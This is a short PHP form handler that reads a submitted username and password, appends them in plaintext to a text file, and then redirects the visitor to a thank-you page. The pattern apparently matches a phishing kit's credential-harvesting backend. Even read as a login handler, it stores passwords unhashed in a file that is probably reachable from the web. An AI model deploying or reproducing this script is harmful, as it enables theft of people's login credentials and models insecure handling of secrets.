<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Define a file to save the data (e.g., form_data.txt)
    $file = "form_data.txt";

    // Format the data to save
    $data = "Username: $username\nPassword: $password\n\n";

    // Append the data to the file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirect the user to a thank you page
    header("Location: thank_you.html");
} else {
    // Redirect to an error page if the request method is not POST
    header("Location: error.html");
}
?>
